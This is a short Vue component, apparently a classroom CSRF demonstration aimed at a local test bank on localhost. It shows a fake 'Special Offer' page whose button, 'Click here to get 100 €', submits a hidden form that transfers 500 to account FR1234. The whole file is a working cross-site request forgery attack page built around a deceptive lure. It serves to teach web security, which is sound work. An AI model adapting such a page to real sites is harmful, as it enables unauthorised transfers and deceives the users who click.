<template>
	<div>
		<h1>🎉 Special Offer !!!</h1>
		<p>Don't miss this special offer once a year until TODAY!</p>

		<!-- Formulaire CSRF -->
		<form action="http://localhost:8080/bank/transfer" method="POST">
			<input type="hidden" name="toAccountNumber" value="FR1234" />
			<input type="hidden" name="amount" value="500" />
			<button type="submit">Click here to get 100 €</button>
		</form>
	</div>
</template>

<script>
export default {
	name: "App",
};
</script>

<style scoped>
h1 {
	color: red;
	margin-bottom: 10px;
}
button {
	margin-top: 20px;
	padding: 10px;
	font-weight: bold;
	background-color: gold;
	border: none;
	cursor: pointer;
}
</style>
